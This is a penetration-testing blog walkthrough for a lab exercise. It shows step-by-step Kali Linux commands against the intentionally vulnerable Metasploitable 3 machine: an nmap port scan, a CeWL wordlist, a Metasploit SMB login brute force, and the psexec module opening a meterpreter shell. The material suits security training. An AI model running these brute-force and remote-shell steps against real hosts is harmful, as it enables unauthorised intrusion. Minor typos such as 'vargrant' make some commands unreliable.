<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">Hack Metasploitable 3 using SMB Service Exploitation</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-metasploitable-3-using-smb-service-exploitation/" rel="bookmark"><time class="entry-date published" datetime="2016-12-14T10:07:19+00:00">December 14, 2016</time><time class="updated" datetime="2025-05-27T12:04:03+00:00">May 27, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;"><strong>Target: Metasploitable 3</strong></span></p>
<p><span style="color: #000000;"><strong>Attacker: Kali Linux</strong></span></p>
<p><span style="color: #000000;"><strong> </strong>Scan the target IP to know the Open ports for running services. I am using nmap command for scanning the target PC. NMAP shown all available open ports and their services today this article will cover SMB login attack for which it requires open SMB port.</span></p>
<p><span style="color: #000000;">Type the following command on terminal in kali Linux.</span></p>
<p><span style="color: #000000;"><strong>nmap –p- -A 192.168.1.11</strong></span></p>
<p><img decoding="async" src="https://4.bp.blogspot.com/-qAUcc7PKA2M/WFEYRxryW0I/AAAAAAAAOow/TQkPqd2PK20Aq_EjGKJqZRL81rud0Zp9QCLcB/s640/0.png"/></p>
<p><span style="color: #000000;">In previous article it’s about SSH Login attack read from <a style="color: #000000;" href="http://www.hackingarticles.in/metasploitable-3-exploitation-using-brute-forcing-ssh/">here</a>.</span></p>
<p><span style="color: #000000;"><strong>Luckily</strong>!!! In Metasploit3 port 445 is open for SMB service mainly used for providing shared access to files, printers, and serial ports and miscellaneous communications between server and client on a network. </span></p>
<p><span style="color: #000000;">Now it is necessary to create a dictionary file to exploit it. To make a dictionary file type the following command:</span></p>
<p><span style="color: #000000;"><strong>cewl</strong> <a style="color: #000000;" href="https://github.com/rapid7/metasploitable3/wiki"><strong>https://github.com/rapid/metasploitable3/wiki</strong></a> <strong>-m 7 -d 0 –w /root/Desktop/pass.txt</strong></span></p>
<p><span style="color: #000000;">CeWL is a customized wordlist generator that sticks to just the site you have specified and will go to a depth of 2 links and returns a list of words which can then be used for password crackers such as John the Ripper.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-JKpRA122fyI/WFEYO3W4eHI/AAAAAAAAOos/0xTjaotCSs0ehkIGdk-uHc7iVm87M1NaACLcB/s640/1.png"/></p>
<p><span style="color: #000000;">Start metasploit framework by typing msfconsole on terminal in kali Linux.</span></p>
<p><span style="color: #000000;">This module will test SMB logins on a range of machines and report successful logins. If you have loaded a database plug-in and connected to a database this module will record successful logins and hosts so you can track your access.</span></p>
<p><span style="color: #000000;"><strong>Type following command under msfconsole</strong></span></p>
<p><span style="color: #000000;"><strong>use auxiliary/scanner/smb/smb_login</strong></span></p>
<p><span style="color: #000000;"><strong>msf </strong><strong>auxiliary (<span style="color: #800000;">smb_login</span>)&gt;set rhosts 192.168.1.11</strong></span></p>
<p><span style="color: #000000;"><strong>msf </strong><strong>auxiliary (<span style="color: #800000;">smb_login</span>)&gt;set rport 445</strong></span></p>
<p><span style="color: #000000;"><strong>msf </strong><strong>auxiliary (<span style="color: #800000;">smb_login</span>)&gt;set smbuser vagrant</strong></span></p>
<p><span style="color: #000000;"><strong>msf </strong><strong>auxiliary (<span style="color: #800000;">smb_login</span>)&gt;set pass_file /root/Desktop/pass.txt</strong></span></p>
<p><span style="color: #000000;"><strong>msf </strong><strong>auxiliary (<span style="color: #800000;">smb_login</span>)&gt;set stop_on_success true</strong></span></p>
<p><span style="color: #000000;"><strong>msf </strong><strong>auxiliary (<span style="color: #800000;">smb_login</span>)&gt; exploit</strong></span></p>
<p><span style="color: #000000;">This exploit will start brute force attack to match the valid authentication and give green sign when founds the correct credential for SMB login.</span></p>
<p><span style="color: #000000;">Our attack is successful and we have got valid <strong>login vagrant: vagrant</strong> as username and password.</span></p>
<p><img decoding="async" src="https://3.bp.blogspot.com/-2SGssyurstk/WFEYSq2zavI/AAAAAAAAOo0/UeLemAv2m0cgI7neJU43jISpjCx5z2-1wCLcB/s640/3.png"/></p>
<p><span style="color: #000000;">This module uses a valid administrator username and password (or password hash) to execute an arbitrary payload. This module is similar to the “psexec” utility provided by SysInternals. This module is now able to clean up after itself. The service created by this tool uses a randomly chosen name and description.</span></p>
<p><span style="color: #000000;">Hence using above credential this exploit will try to provide the meterperter shell.</span></p>
<p><span style="color: #000000;">Type following command to use this module for attack.</span></p>
<p><span style="color: #000000;"><strong>msf&gt; use exploit/windows/smb/psexec</strong></span></p>
<p><span style="color: #000000;"><strong>msf exploit (<span style="color: #800000;">psexec</span>)&gt;set rhosts 192.168.1.11</strong></span></p>
<p><span style="color: #000000;"><strong>msf exploit (<span style="color: #800000;">psexec</span>)&gt;set rport 445</strong></span></p>
<p><span style="color: #000000;"><strong>msf exploit (<span style="color: #800000;">psexec</span>)&gt;set smbuser vagrant</strong></span></p>
<p><span style="color: #000000;"><strong>msf exploit (<span style="color: #800000;">psexec</span>)&gt;set smbpass vargrant</strong></span></p>
<p><span style="color: #000000;"><strong>msf exploit (<span style="color: #800000;">psexec</span>)&gt; exploit</strong></span></p>
<p><span style="color: #000000;"><strong>Wonderful!!! </strong>Our meterpreter session 1 is opened and you have got victim shell.</span></p>
<p><span style="color: #000000;"><strong>meterpreter&gt; sysinfo</strong></span></p>
<p><img decoding="async" src="https://2.bp.blogspot.com/-EgByOh3RfFY/WFEYSuYPE0I/AAAAAAAAOo4/edD9NvLw_zwdwG68inScFEHJ9gtHzwSUgCLcB/s640/4.png"/></p>
<p><span style="color: #000000;"><strong>Author</strong>: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"><strong> here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
